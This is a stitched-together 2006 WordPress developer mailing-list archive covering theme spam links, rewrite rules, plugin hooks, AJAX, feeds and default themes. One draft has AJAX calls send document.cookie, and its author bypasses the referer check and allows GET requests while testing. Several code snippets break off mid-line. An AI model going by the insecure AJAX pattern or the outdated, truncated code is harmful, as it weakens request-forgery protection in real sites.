rejected. And justly so, if this is the WP-CoreImprovement list.  

Here are the first five unique rejects I found:
How do I integrate a form into a page template?  (included PHP code)
How can i remove the a tag *only* from parent pages? (included PHP code)
[Is] anyone is aware of a way to hide or minimize the file upload iframe
section? (Solution was a hack that happened to already have in code Mark
wrote)
I am looking for code that will create a dropdown menu in my sidebar
[containing the categories] (included PHP Code)
What are the differences between [using the_date and the_time] for inside
the loop? 

Most people trawling the forum CAN'T answer those questions.  That's why we
had the whole "Lack of code savvy volunteers vs wp-hackers" discussion.  All
of these were questions involved hacking WP code to make their sites do what
they wanted.  So they wandered into here.  It sounds like where they should
be.

The purpose of this list is fine, but the name causes people to be shunted
back and forth. It also makes the list look elitist, when it really isn't.
List members are shunting those questions elsewhere because they really are
off topic to the description of the list.  The problem is that they aren't
off topic to the name of the list...

That's how I see it anyway...

I think major plugin authors *should* be paying attention and making
sure their plugin is compatible with all the changes in 2.1

I did so with podpress, found some problems and a number of great new
structure/features that I was able to leverage.

btw, I had problems with category data in feeds as well, but found that
is_category() just seems screwed up and I just worked around that with
no problem so my categoryCasting feature works.

Agreed. I already have an updated version of my video quicktags plugin
sitting on my PC that has been completely recoded with 2.1 in mind. :)

I guess you all know the very famous Connections theme and the "Connections Reloaded 1.5" fork of it?

Double-check the footer.php script. I have found a hidden rel="nofollow"-less link to wordspace[dot]info which is a parked domain!

Their PR is 5 regarding to www[dot]database[dash]search[dot]com. So they are making money with it. Damn money-maker jackasses...

You will find a div-tag around it with "height: 1px".

Just to say it. Remove that "div-hiding-spammy" link and you stop bad money-makers.

I'm angry about this because they make money by using spammer's "technology" (div-hiding) to boost their ranking on several search engines with a cool (Patricia, it's not your fault! I like your link because you put tons of time in it but not wordspace) theme and my non-profit blog. :(

@wordspace: Can you ask us to place a link to your parked domain before abusing Patricias great work?!

And sorry for that link below. It's GMX' fault and I'm not at home.

Just and FYI on this issue from last month. I ended up writing my own  
plugin to handle relocating the file upload section. The box is moved  
into a dbx panel and now functions similar to the the Custom Field,  
Trackbacks items. You can collapse it out of the way or move it  
around in the list.

The plugin can be found on the WP-Plugins.net site

Message-ID: <A7DEA718-B945-4FB6-8EB6-A4AF361D5C2E@yellowswordfish.com>

Good day all

There has been some interesting discussion on this list regarding  
where users, hackers and plugin authors can ask questions to help  
them better understand what is going on in the WP bowels. I for one  
would welcome a list or forum where expertise is available as I find  
many questions I ask on the support forum go completely unanswered  
due, I understand, to a lack of knowledge. Yet when the Codex, the  
support forum and Google fail to shed any light on a query you reach  
a dead end. (As an aside, searching the support forum has improved  
greatly in recent months although it would be more useful for the  
extract returned to contain more of the actual query as opposed to  
the date, time and age data).

For example, a question I raised a week or so ago:

"In the last couple of days, after 18 or so months of the site being  
in place, the entry 'rewrite-rules' has been created in my options  
table. It is enormous. Scanning to the end, it is also truncated. It  
also, oddly, was not created with the next 'auto' number in options  
but given a much higher id key. My questions are really:
Why did this suddenly get created?
What were the circumstances that caused it to get created?
Is it actually required?
Does it matter that it appears to be truncated mid-word?
I see that others have raised questions before with this option row  
that suggest it can lead to problems? None seem  to be answered.  
Shoud I be worried?"

I could find nothing on this in the Codex (and I accept I may have  
missed it)  and the only entries in the support forum all seem to  
remain unanswered. Yet I would very much like to know the answers -  
to put my mind at rest AND to give me a greater understanding of what  
is going on. Plus the fact that this entry ending mid-word suggests  
to me an error and potential problem.

Whilst I would still welcome answers to the above, my question here  
is where should I actually be asking this? Hackers? Testers? Anywhere  
else I donlt know about?

And if I still have anyones attention perhaps I could tack on the  
second question! Does anyone know if the author of the wp-cache  
plugin is still supporting it as his comments seem to have closed  
back in June and I'd like to discuss - and find out why - it doesn't  
seem to work for me!

As long as you exercise due diligence in searching the forums, codex  
and Google for the answer, and assuming it isn't something that  
someone with a modicum of PHP knowledge could discover by looking at  
the code, I have no problem with it coming up here.  Perhaps you  
could even take the answers you get to the Docs mailing list where  
you discuss how best to put that information into the Codex.

This is the series of regular expressions and matches used by WP's  
internal rewrite engine (compressed into a serialized array).  Think  
of it as mod_rewrite implemented in PHP (for greater compatibility  
and perfect compatibility between people using mod_rewrite to pipe  
everything through WP and people using the /index.php/ or 404 tricks  
to pipe things to WP).

If you have a permalink structure, yes.

That sounds strange, could you pastebin it?

As I said, I have no problem with this particular question on wp- 
hackers, because (1) you exhausted all other avenues (2) it's not a  
dumb question that could be answered with 5 minutes and basic PHP  
knowledge.

Here's something I'm throwing out there.  What about if the mods in  
the WP.org support forums were given a way of marking a thread as  
"expert" ?  As needing the advice of an expert.  If it's something  
they've never seen, and something that Google and the Codex know  
nothing about, they could tag it as needing an expert opinion.   
People like me could subscribe to that tag in their RSS reader.  As  
long as it was only a few questions a week and as long as it  
adequately filtered lazy or repeat questions, I'd be happy to chime  
in with answers when I have them.  The problem with the forums the  
signal to noise ratio is too low for people with expert knowledge.

[andy] OK - I suspected that triggered it. I updated permalinks  
because of a change I made with the UTW path. Just weird that it  
wasn't there before as my last DB backup shows. Or.. is it just that  
phpMyAdmin doesn't see it? Certainly the row doesn't show up when I  
'browse' from phpMyAdmin so perhaps it doesn't include it in a sql  
dump either...

[andy] if you mean pastebin.com then it wont save it - they say they  
are having problems of some sort. I re-performed the 'update  
permalinks' to see if that sorted it and now it is truncated at a  
different spot but still seems to end where it shouldn't. Here are  
the last two lines broken out:

	s:45:"(why-bother)/feed/(feed|rdf|rss|rss2|atom)/?$";
	s:47:"index.php?pagename=$matches[1]

I assume that at least a double quote should be on the end. (Current

Message-ID: <5549554B-3716-41C8-A092-47A1F595E661@codehooligans.com>

Greetings all and Happy Friday!

So I received a request from a client this week and have been doing  
some digging. The request was to provide some facility in the Post/ 
Pages editor screen to ad links to other entries. The concept here is  
the user clicks on some toolbar icon like the current link icon on  
the tinymce WYSIWYG. Instead of just asking for the link the user  
would actually be able to select the link from Post/Pages/Links. Wow  
what a novel idea. For the non-technical person the act of adding a  
link to a page means they have to first get the link from an existing  
page or whatever and past it into the link popup. Again I think this  
is a great solution so I'm starting to think about some plugin/ 
extension to tinymce.

Just wondering if someone has seen or possibly created something  
similar before I try and reinvent the wheel. I've gone through the  
tinymce code and see that I can override the 'insertlink_callback'  
option and basically define my own popup code. Just wondering if  
someone has maybe gone down this road before me. If not no problem.

1.5 and earlier used a long list of mod_rewrite rules to handling  
fancy permalink structures.  2.0 and later pipes everything though  
the PATHINFO using about 4 lines of mod_rewrite fu and handles the  
individual rules within WP using PHP.  It may be that you still have  
the old mod_rewrite rules in your .htaccess, so your site continued  
to work in that backwards compatible mode.  If you have WP-related  
mod_rewrite rules in .htaccess that look more robust than this:

> # BEGIN WordPress

> RewriteBase /

... then that is likely what was happening.

I meant your pastebin of choice... there are many.  But yes, those  
last two lines don't look right.  How did you get that?  It could be  
that the method you're using to look at your options table is  
truncating the display of the option_value column, so that it's just  
a display issue.  It'd be very strange to have a value like that in  
the database.

You could throw this into your WP root folder and access it to see  
the full value:

> <?php
> require('wp-config.php');
> $rewrite_rules = $wpdb->get_var("SELECT option_value FROM $wpdb-

That was one of the suggestions offered in the original discussion.  The
more positively received idea was to have a special forum that only mods
could create posts in, but anyone could reply in, but that idea has fallen
on deaf ears.

Perhaps those that would be willing to offer this type help agree on a tag,
and I will make sure that the active volunteers know the tag, and understand
what level of inquiry would warrant the tag.  I'll then post back to
wp-hackers with the exact feed link for that tag.

I suggest something fairly unique, so as to limit the noise.  (wp-advanced
???)

Expert might work, but there are the occasional posts tagged "expert" when
they are referenced to something more appropriate for wp-pro, but then
again, those answering these type threads may be interested in some
potentially paying work.

feed://http//wordpress.org/support/rss/tags/expert

Anyway, if there's some consensus for the tag, I will make sure that it gets
used, at least that would be a start.  Once that happens, perhaps I can
coordinate with someone from wp-docs to see that some of that might be
worthy of addition to codex.

+1 for the "expert" thread with an RSS feed in the forums.  

Even though I normally lurk here as a plugin author watching for issues that
might affect my plugin, I'd subscribe to the expert RSS feed and be happy to
answer questions on the few areas that I feel qualified to answer (how to
plugin to the RTE options for a TinyMCE plugin, how to create a plugin that
will work with both the RTE and the text editor, etc.)

As it is now, I don't visit the WP forums because I find them too
disorganized.

Thanks,

You are quite right Mark. My error. And apologies. Looks like BBEdit  
was responsible for the truncating.
And my .htaccess looks right for 2.0 as well. So I'm good to go.
I'm surprised I hadn't updated permalinks earlier than this....
Thanks for your time and for explaining all to me.

And if anyone knows an expert on the wp-cache plugin I would be a  
happy man...:)

Seems the authors of Garland (the new default theme for Drupal) are a
little upset[1] about WP porting it for WP.com[2]. Steef (one of the
authors) came in and made a big stick in #wordpress just a few minutes
ago (I have a log if anyone wants to see it). They're really upset
about this. I was just wondering what Matt and Co. had to say about?

You can tell them that three days later, this is already old news. :)

Matt has apologized for any branding and linking confusion and announced
that the theme will be disabled until after the Drupal 5.0 release and
Drupal.org has acknowledged this and Matt confirmed it on their site.

http://drupal.org/node/103007#comment-180011

My question is if the WP port will be made available for download sometime
later.

Matt's on top of all this and has done the right thing.  

It's a lesson to all of us though, that when we port/convert something, it
is a REALLY good idea to give the original author one more review before it
goes live.  In the GPL world, you don't have to agree to everything the O.A.
says, but it will help you avert (or prepare for) any nasties like this
coming down the road...

I guess someone didn't get the memo then. The guy came into IRC really
peeved. Someone asked what Garland was after Steef asked if anyone
knew about the situation and he immediately responded with:

[12:19] <Steef> the new main drupal theme which I designed, and some
moron ported to WP before we could even release a version of drupal 5
[12:19] <Steef> that is what Garrland is

Pretty bad attitude the whole time he was there. *shrugs*

The attitude really does leave a poor taste in my mouth. I know it's
not *exactly* the same situation, because Drupal doesn't offer a
hosted service like WordPress.com, but I don't recall anyone in the WP
camp raising a big fuss whenever Kubrick was ported to Drupal.

Anyway, kudos to Matt and crew for doing "the right thing" - it really
is disturbing though to have them fuss so much.

You should write not only for mce but only for ordinary posting page.
An hint would be a popup windows, showing a text input with just added
scriptaculos 's autocompletition (you write the text, it shows the
nice-titles)

Subject: [wp-hackers] Prototype.js and Amazon Link-Enhancer Conflict
Message-ID: <45840C78.6020808@mikekoepke.com>

I've run across a compatibility issue with prototype.js and Amazon's 
Link-Enhancer script.  Amazon's script adds popup up functionality so 
that when someone mouses over an Amazon link, you get a popup window 
with the item, price, review, Buy Now etc.

The code Amazon you add to the footer is:

<script type="text/javascript" 
src="http://www.assoc-amazon.com/s/link-enhancer?tag=mytag-20">
</script>
<noscript>
    <img src="http://www.assoc-amazon.com/s/noscript?tag=mytag-20" alt="" />
</noscript>

I am trying to use Alex King's Share This, which has you include the new 
prototype.js (slotted in WP 2.1) into the wp-includes directory.  What 
happens when prototype.js and the Amazon script are both included is 
that the blog never fully loads the page.  A bunch of javascript 
warnings are generated:

I've done a bunch of web searching on this issue and haven't come up 
with anything.  I did run across a forum post where someone else ran 
across the same problem using WP and the K2 theme.  
http://getk2.com/forum/showthread.php?t=2227.  He never resolved it either.

We have both isolated the issue to the inclusion of the Amazon script 
along side of prototype.js.   As WP 2.1 will be including prototype.js, 
I thought I'd point out the potential problem to others in the future 
and see if someone has a fix for the conflicts.

It might have something to do with the `for in` loops in the link
enhancer JavaScript, e.g. `for (var locale in imp)` on line 207.

Basically, it's not safe to use `for in` to loop over arrays without
extra type checking, because any third-party JavaScript can wreak
havoc by extending the object prototype. That looks like what's
happening here. There was quite a bit of drama last year over
Prototype.js breaking people's scripts:

   http://erik.eae.net/archives/2005/06/06/22.13.54/
   http://blog.metawrap.com/blog/WhyIDontUseThePrototypejsJavaScriptLibrary.aspx

If that is the problem, the Amazon code has to be changed. There's a
succinct explanation (and explanation of the fix) here:

Subject: [wp-hackers] Avoiding user profile editing to non administrators
Message-ID: <1166354337.13615.5.camel@localhost>

Hello to all wp-hackers ;)
	I just want to avoid registered users to edit their profile, because
it's filled by data i fetch from the outside authentication program. 

But, I'm keeping user roles. So I would still let admins and editors to
edit other users.

I've tried hooking to show_user_profile but it's used to add personal
fields to the profile form. 

Is there some hook to user profile display or the clearest method is to
sniff with a regex the $_SERVER['SCRIPT_NAME'] variable looking for
wp-admin/profile.php$  ???

Ciao! :)

I think I've walked into the wrong room, but regardless:

Some  search engines have begun penalising sites for  having
these infamous inbound links. It is tricky, however, because
so-called  Web  2.0  involves a lot of  uninvited  SPAM  and
people   can   penalise  their  rivals  by   linking   while
deliberately violating guidelines for Webmasters. If you are
concerned  about spammy sites, file a complaint and it  will
be investigated (here's an option for reporting to all major
SE's in parallel: http://www.schestowitz.com/report-spam/ ).

Best wishes and happy holidays,

Roy

Just make a plugin that checks to see if the user has the permissions to
edit other user's profiles when someone visits profile.php. If they don't,
die() with an error message.

Er, ha, that's what you said (didn't read to the end).

Yes, that'd probably be the best way (check the script), although this is a
better/easier test:

if ( 'profile.php' == basename($_SERVER['SCRIPT_NAME'])  &&
!current_user_can('edit_users') ) die('Sorry, you aren't allowed to edit
your own profile.');

Although a prettier error message would probably be better. ;)

Or, add the current_user_can check in front of the profile link
in the top right, the main users tab, and check the same in
wp-login.php and redirect them to the main site from the
login. Unless there's additional options they can play with
back there, why let them in at all?

Of course a check in profile.php too, so it can't be loaded
directly.

No links, no error messages.    :D

Is there going to be a new default theme in WordPress 2.1? I remember some
discussion back in August and September but since then, nothing.

I don't think there will be major changes. I figure it will just be a
modified Kubrick. I think we were talking about Sandbox though.

That's my memory too. Was that rejected or just peter out?

Yeah, I've read the archive. Unless I've completely missing something, the
discussion ended here:
http://comox.textdrive.com/pipermail/wp-hackers/2006-September/008735.html

I'm no SVN expert, but it doesn't look like anything happened to the sandbox
branch once it was set up.

Too bad.

Since there is now scriptaculos embedded into svn why not to trash the
classic theme and make Kubrick the classic? So the new default could be
an ajax powered enchanced scriptaculos theme.

Not in 2.1, but maybe after that we'll include a new theme in addition 
to Kubrick. I think 2.2 will emphasize a lot of theme improvements.

Subject: [wp-hackers] Blogs Occasionally Show Up Without CSS
Message-ID: <20061220171823.h5ib4e1ddqvwgc44@banana.catalyst2.com>

Hey, folks. I have been having a mysterious problem with two WordPress  
blogs. It has gone on for a few weeks now. While the two blog reside  
on separate domains, they do share the same Web server (Apache 1.3.x).

Here's the issue: every once in a while, the stylesheets are not being  
delivered or used, leading to barebone pages appearing everywhere.  
Trying to access the admin panel at that stage surprisingly reveals  
that the admin is logged off (cookies don't expire). Logging in again  
seems to resolve the problem, globally. This behaviour recurs rather  
sporadically and since I have not changed the code recently, I suspect  
it /could/ be a server issue. Any idea what I ought to check? After  
weeks of attempting to resolve this problem I have run out of ideas.  
Many people are viewing ugly pages as a result and the problem does  
not seem to go away, either.

Many thanks for any advice you may have.

...Or   Mike's  feed  corrected  (although  looking  at   my
feedreader,  nothing has gone awry)... *smile* or Planet  or
whatever  aggregator is involved appropriately tweaked. It's
natural  for  a  single feed to go funky and  mess  up  with
aggregation...  look  no further than Yahoo News and  Google
News,  among  others. Exclusion seems a little  harsh.  Mike
Little is the co-founder of WordPress, so...

As I've just posted, it seems to stem from upgrading to version 2.0.5
earlier today. I think someone else suffered the same problem earlier
in the year.

Alas I don't know how to correct the problem. I'm just hoping that no
more are marked as new!

My apologies for the rash email.

I believe an ideal solution would involve Planet sorting entries on their
side by the published "date" tag for each entry rather than relying on the
entry id/status. Doesn't this mean that every time a new feed is added to
Planet's aggregate all its previous entries would be marked as unread and
new? :\

Let's just hope this doesn't happen when everyone moves to 2.1 and it's
much-revised feed engine.

(Thinking  aloud perhaps:) I wonder how you choose to handle
theme  changes in upgrades. With so many people already  (or
/still/)  using  Kubrick  you can't just drop it.  Also,  if
changing default themes, there ought to be some check during
upgrade,  ensuring that the current theme is not superceded,
overridden,  or  replaced.  This could  get  slightly  messy
because  people don't like noticeable and unwanted  changes,
even  if  a  few clicks revert back to  old  settings  (e.g.
Dapper->Edgy, XP->Vista).

That's a good point - newer isn't always better... I personally never
thought about it.
I guess we don't have to worry about it for 2.1, but in the future? 

Is removing Kubrick from the core, but using it if it already exists and is
selected good enough? (assuming, of course, that Kubrick is replaced with
Sandbox)

It  must  be a deficiency in the aggregator  which  produces
that bunch. My feedreader doesn't detect any diff. I can see
the item you have just posted though (5:12 GMT) and it's the
only  one that's marked as unread. It's usually changes from
RSS  1>2 or Atom that lead to inconsistencies. I can  recall
Matt  posting  about  this  when  TypePad  had  made  global
changes.

Is your feedreader subscribed to Planet or Mike's own feed?

If the former, WP uses MagpieRSS as its in-built "client" of sorts for
subscribing to Planet feed. MagpieRSS: http://magpierss.sourceforge.net/ 

It hasn't been updated in ages, so that makes me think that if MagpieRSS is
the weak-point it's a Conditional Get failure. I've been speaking to the
guys at FeedBurner, there's something in WP's latest (testing on 2.1) feeds
that results in broken Conditional Get & HTTP 304 headers - so far it seems
to be a FeedBurner problem.

Not sure if this is actually of any use, I also don't know if the version of
Magpie that ships with WP is modified from the 14-month-old 0.72 version
available for download from the official site, but that's where I'd look....

Thank you. I am not going nuts.

I have the same issue on 2.0.4, 2.0.3 and 2.0.2 wordpress builds running 
apache 1.3 then replaced with apache 2 and then 2.2 all running over SSL 
and very rarely the same occurance on non SSL based pages.

In any event a page refresh tends to work until you navigate to the next 
page when the CSS won't load again. The user seems to remain 
authenticated at all times though (my skin has icons that are only 
visible when logged in).

I run a few other sites that are served from the same server instance, 
and don't seem to have suffered yet... although they may not get the 
same level of usage.

Any help much appreciated.
Thanks
Nigel.

I thought it was associated with the way the URI was being called, then I

I tested this in IE 6 as well as Firefox 1.5 And more recently 2.0. The 
problem seemed to go away for a while after the firefox upgrade, but is 
now back... similarly with a connection reset that I don't think is 
related to this problem.

First of all when upgrading, users are not encouraged to delete their
wp-content, so Kubrick won't be so easily deleted from current setups.

Second - if people like the theme - there is a Kubrick Sandbox skin :)

Happy hacking,

It would be ironic to have a new default theme in WP 2.2, and still have
Kubrick's folder labelled as 'default'.

What do the devs plan to do about that?

Subject: [wp-hackers] Need feedback on modification to pingback_ping(),
	new hook
Message-ID: <d9a04aea0612201958j31c7bb47m948ae08f2354d9b0@mail.gmail.com>

Hello,

I'm working on an extension of the pingback mechanism that I don't
think fits as a separate xml-rpc mechanism that could be put in
pingback.extensions

For background, see my post about VoteLinks [1] (and mentally
substitute pingback for trackback)

So what I want to do is, during the pingback process, when WP is
scanning the sending post for the link, check to see if the link
contains a REV="vote-for" (/vote-against/vote-abstain) attribute, as
defined by the vote-links spec [2]. if so, then we store that
information somewhere so that themes or plugins have access to it,
essentially giving the link-ee the "intent" of the link.

Architecturally, I think that all that is needed is a hook/filter
somewhere during the link scanning process that would give plugins a
shot at what's being scanned, but i'm not at all certain of that

In my current implementation, I added a call to apply_filters
('pingback_link', $thefullAHref) that returns an array of extended
attributes that get merged with $commentdata. Then, I have a plugin
that adds a 'preprocess_comment' filter to modify the commentdata
based on the whether there is a vote in there.

Clear as mud, right? I'd love some feedback on the idea in general,
and my proposed implementation in specific. Ultimately, it's going to
require modifying pingback_ping() to provide the mid_ping hooks.

Thanks,

--Steve

I say that Classic remains Classic, Default moves to Kubrick, and  
whatever theme is chosen as the new theme (sandbox + hawt CSS,  
please) be given a unique name (i.e. NOT "Default").

Users are NOT supposed to replace the wp-content folder when  
upgrading, so eventually we could retire Classic and Kubrick if we  
think that the upkeep burden is becoming too much.

Yeah, "default" is a bad idea IMO.

Message-ID: <e32644660612202321y33d33ae1nf215e126bdecbe57@mail.gmail.com>

Esteemed Hackers,

I am working on a project that involves a network of around 15 sites. Each
site has its own domain name. Instead of
installing/maintaining/syncing/etc... 15+ possible Wordpress installations I
hoping WPMU would bring things together in a more manageable environment.

I have spent a few hours attempting to setup such a WPMU installation with
minor success. Without getting into details, quite yet, is there any formal
support/documentation for doing just this? If I am not mistaken there are
existing WPMU blog networks offering a "bring your own domain" feature,
which achieves a similar result, a blog with its own domain connected to a
WPMU install.

Any help would be greatly appreciated. If needed, I can go into detail on my
attempted installation/configuration, where I am and what's keeping me from
moving forward. I thought it might be easier to approach it in a "vanilla"
fashion first.

In short-handed summary:
* Domains: a.com, b.com, c.com, d.com, etc...
* One WPMU install to manage a single blog on each domain

Interesting topic.
How much support for this thing is there? Is it just another "standard" or
does it actually have potential the utopian dream of a semantic web? Is this
like, say StumbleUpon, except on a de-centralized, per-server level?

Yeah, this isn't really MU territory. I don't know if MU developers even
read this :o.

There aren't any plans to remove Kubrick currently.

We're all tired of it because we've seen it thousands of times for two 
years now. But people new to blogging/WP love it.

I knew that. I'm just worried you'll create a new default theme, and
leave Kubrick's folder called 'default' for the sake of compatibility.

Yeah, in fact, Kubrick is the reason I first found out about WordPress.
At the time, the blog at http://whereswalden.com/ (specifically I was
linked to the post
<http://whereswalden.com/2005/02/25/firefox-prefwindowv/>) was running
Kubrick. Because it was the first time I'd seen that theme, I was
captivated, went to the WordPress link featured in the footer,
downloaded WordPress, and now I'm a WordPress user!

The way theme file fallback works many themes might be relying on 
Kubrick's PHP files being in default and not even realize it.

That's a pretty neat story, doubly so now that you're participating in 
WP development discussion.

Have a suggestion?  It's only one character longer than  
wp_specialchars and we're saving a few characters because this  
doesn't require a second param to be passed.  It'll probably be used  
more consistently if its purpose is obvious and its name easy to  
remember.  I also modeled it after js_escape() which is a sibling  
function (special purpose escaper).

Hi guys,
i want to know more about Official Wp Stats.
I transfer the blog from Wp.com to my personal host. I want to have the same Blog Stats that are on Wordpress.com admin panel. There is a plugin or a widget solution for this ? For me,the possibility of having the referrers and a designer of the views in continuos updating (with a graph ie) is interesting. Thank you very much.

A least attr_escape?

It is so widely used that we could even sacrifice some clarity for
convenience, here are some more suggestions:
attr_esc
attr_safe
attr

There are some more examples of these in the patch in ticket 3474 [0].
However the unforeseeing  ticket reporter had produced a monolithic
patch only and the js_escape portions have to be extracted by hand.

Is it really that big of a deal having a few extra characters? I'd much
rather have the function name be clear as to what it does rather than have
it be as short as possible, especially since there are LOADS of other places
where we could trim down filesize if it was actually an issue (and I
personally don't think it is).

Speaking as someone who just looks at small bits of code for very minor
tweaks, descriptive function names (and variable names) are always a Good
Thing.

It's a hacked copy of 0.54, IIRC.

Subject: [wp-hackers] Documenting AJAX for plugins in 2.1
Message-ID: <b65af1a30612211346p317f8ea9k2159ecd7f6e9fc44@mail.gmail.com>

I've been pouring over the source in HEAD, deciphering more about the
filter/action invocation system so I can figure out how to register an
ajax-target function with the $wp_filter global.  I wanted to validate my
thougnts in an effort to help develop the documentation for this.  I am
asking the wp-hackers community to review this for accuracy and fitness
before I take it to codex.


begin by defining the ajax function:
  function pluginajaxfunction()
  {
    // build the response
  }

then register the ajax function:
  add_action(wp_ajax_uniquepluginajaxtag, pluginajaxfunction, priority,
parameters);

    Note: You may choose your own "uniquepluginajaxtag" but care should be
taken, just as with naming plugin functions, toward preventing name
collisions [link to Writing_a_Plugin#Avoiding_Function_Name_Collisions].
When registering the function, prepend "wp_ajax_" to the tag.

Your AJAX call should request the url:

  [...]/wp-admin/admin-ajax.php

  via POST (not GET) with the parameters
      action=wp_ajax_uniquepluginajaxtag
      cookie= document.cookie

    Note: You must prepend "wp_ajax_" to your "uniquepluginajaxtag" in the
action parameter when invoking it, as well.
    Note: AJAX scripts must pass cookie=document.cookie to identify the
authenticated user session, as this invocation method is meant for the
administrative area.

Example of the server-side:

// within the scope of your plugin
function example_ajaxupdate()
{
    echo "<h1>Success!</h1>";
}

add_action('wp_ajax_example_update', 'example_update');


Example of the client-side:

[TBD]

(asside: hacking a bit to get around the check_ajax_referer() call and
allowing GET instead of POST, I was able to get this to work in 5 minutes)
http://localhost/wp-admin/admin-ajax.php?action=wp_ajax_example_update

Question:
prototype.js is *not* automatically included in all pages within the admin
area in 2.1.  What is the prefered means of adding it to a document head, or
should we resign ourselves to adding it through a script tag in the document
body when necessary?

regards,

Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9D021E6AD7@dsimail.drbsystems.com>

Some of you might remember the auto-update script that I ran by you all,
about four months ago.  It meant to make updating one or more blogs much
easier, but it had some restrictions.  

Well, it's grown since then.

I suspect many/most of you have MUCH more *nix experience than I have and I
would like your help in ensuring this method isn't gonna crash any typical
*nix based, non-core-code-customized blogs.  I was wondering if some of you
might review this script and tell me of any errors or problems you can
foresee.  I've got it working just fine updating my blogs. But, I'd like
more  of a confidence factor than what I can get just having it work for me
and only me.

How does this look to you? 

BTW, if you don't know how to take this from the email, put it on your
server, set the rights, and run it, you probably should not review it at
this stage.  Soon...


OH! And I just realized I never did add the commands to Wget the Upgrade
page...  I'll have to do that yet... I'll change back to the tmp directory
first I guess hmmm...

Crap... I'm sorry, I was testing a relative cp in that version...  No harm
will be done, it just won't update the directories.  To restore the correct
operation, 

The line that reads:
  cp -R -v --remove-destination $tmp .

Should be replaced with this:
  cp -R -v --remove-destination $tmp/wordpress $CommonRootPrefix$CurDir

I should have caught that before I sent it.  Sorry...

Anyway, I don't understand why relative directories don't work in the
script.  I'm still trying to figure hat out.  Why can't I use . in a cp
command or ~ in a cd command?  I've done that in other scripts but it
stopped working in this one... Anyway, sorry for the confusion...  Restore
that line and it will update the blog dirs correctly

I'd like to propose two more hooks for Wordpress, one in pingback_ping()
and the other in wp-trackback.php.

background: http://redmonk.net/archives/2006/12/21/voteback/

The first hook would allow plugins to have access to the full text of a
hyperlink on a site that is pinging this site, before the comment is
built for a ping.

The second would allow plugins to have access to the full post data for
a trackback before the comment is built.

I don't really have recommendations for the names of the hooks, but I
thought I would put this out here for comment.

For me,the possibility of having the referrers and a designer of the views in continuos updating (with a graph ie) is interesting. Thank you very much. 

Not yet, but we are planning a plugin for that.

Subject: [wp-hackers] Detecting and fixing non-compliant themes
Message-ID: <458B30BC.6080407@kuykendall.org>

For podPress I have to hook into the wp_head() call which should be in
the header.php and the wp_footer() in the footer.php

However, I have been getting bug reports from users saying that the
player didnt work or that there was some javascript error. These things
would be caused by those two calls not being done in the header.php and
footer.php

To solve this I added a little code to detect theme compatibility and if
non-compliant it will let the user know whats wrong and how to fix it in
the theme.

If anyone is interested, it works like this
1) I have a themeCompatibility setting added to the config. The values
should default to false

2) in callback for switch_themes I set the values to false. This forces
a recheck anytime the user picks a new theme

3) in the callback function I register for wp_head and wp_footer I put
code to set the themeCompatibility settings to true for their respective
 area

4) At the point where I want to inform the user about the
problem/situation I check the themeCompatibility settings and display
appropriate text to explain to the user what the problem is and how to
use it.

Here is code that would work. Its not the exact podPress code, since I
normalized it (removed podPress variable references).

// a couple of globals
$themeCompatibility = get_option('themeCompatibility');
$inAdmin = strpos($_SERVER['REQUEST_URI'], 'wp-admin');

//in the registered callback for wp_head
if(!$inAdmin) {
  if(!$themeCompatibility['themeTested']) {
    $themeCompatibility['themeTested'] = true;
    update_option('themeCompatibility', $themeCompatibility);
  }
  if(!$themeCompatibility['wp_head']) {
    $themeCompatibility['wp_head'] = true;
    update_option('themeCompatibility', $themeCompatibility);
  } else {
    $themeCompatibility['wp_head'] = true;
  }
}


//in the registered callback for wp_footer
if(!$inAdmin) {
  if(!$themeCompatibility['themeTested']) {
    $themeCompatibility['themeTested'] = true;
    update_option('themeCompatibility', $themeCompatibility);
  }
  if(!$themeCompatibility['wp_footer']) {
    $themeCompatibility['wp_footer'] = true;
    update_option('themeCompatibility', $themeCompatibility);
  } else {
    $themeCompatibility['wp_footer'] = true;
  }
}

// Then somewhere along the line (maybe on the themes page) it
// can check to see if the theme is compliant.
// Keep in mind, the user has to visit the main blog page for the checks
// to take place, so it verifies that first.

if(!$themeCompatibility['wp_head'] || !$themeCompatibility['wp_footer']) {
  echo '<div class="wrap">'."\n";
  if($themeCompatibility['themeTested']) {
    echo '	<h2>'.__('Theme Compatibility Problem').'</h2>'."\n";
  } else {
    echo '	<h2>'.__('Theme Compatibility Check Required').'</h2>'."\n";
  }

  }
  echo '		<table width="100%" cellspacing="2" cellpadding="5"
class="editform">'."\n";
  echo '			<tr>'."\n";
  echo '				<td>'."\n";
  if($themeCompatibility['themeTested']) {
    echo '				The "'.get_current_theme().'" theme fails to meet

  } else {
    echo '				Wordpress as not yet detected the
"'.get_current_theme().'" theme to be compliant. Please visit your <a
href="'.siteurl().'">main blog page</a> for WordPress to
re-check.<br/><br/>'."\n";
  }

  if(!$themeCompatibility['wp_head']) {
    echo '				The header.php in your theme needs to be calling
wp_head(); before the closing head tag.<br/>'."\n";
    echo '				Change this:<br/>'."\n";
    echo '				<code>&lt;head&gt;</code><br/>'."\n";

    echo '				<code>&lt;?php wp_head();

It's funny, I was just thinking about this problem the other day, and 
considering making a "theme validator" plugin which checks for the 
existence of all hooks. Shall we join forces?!

Well, your welcome to use the code I have posted. I already have it
working in podPress.

What I think is that this belongs as part of the standard wordpres
functionality. To help ALL users avoid problems caused by bad themes. It
would also help theme writers avoid releasing non-compliant themes to
begin with,

I honestly never heard of it, though I do use MagpieRSS on my own
website and in several contracts for clients. I'm always willing to
try something new though... but then again, if it's not broke, why fix
it?

Nevermind.
Just checked, SimpleRSS isn't PHP. It's Delphi and Kylix.

The Magpie project really shouldn't die out - the original codebase is
excellent. Why coud improve it in the WP core, and then submit patches
to the original project you know...

MagpieRSS seems to give up too easily on parsin a feed.  I'm not sure
if that's more PHP's fault than MagpieRSS's, but that's one of the
issues I have with it.

I think I've heard a few other projects talking about SimplePie as well,
but off the top of my head I can only name Gregarius.  The Gregarius
devs have already made changes to their copy of MagpieRSS, and before I
switched to using Gregarius, I used their MagpieRSS in my own projects
to improve feed parsing.

Best regards,

http://simplerss.sourceforge.net/

That's what I was looking at - totally different project. I hate it
when products have the same name!

But simplepie.org looks awesome, I'm going to have to give it a shot.

Then again, think about it. SimplePie isn't a RSS *creation* engine,
it's a parser.
WordPress doesn't parse much. Besides the dashboard, AFAIK Magpie
really only exists so *plugins* that parse don't have to bundle with
it.

In my experience, MagpieRSS is just fine given a properly validating
feed on a 100% proper set up.

However, I'm going to switch to SimplePie simply because it has
complete multi-lingual support:

/*********************************************************************\

Whether it's the UTF-what's-it or the ISO-who's-it, SimplePie has it
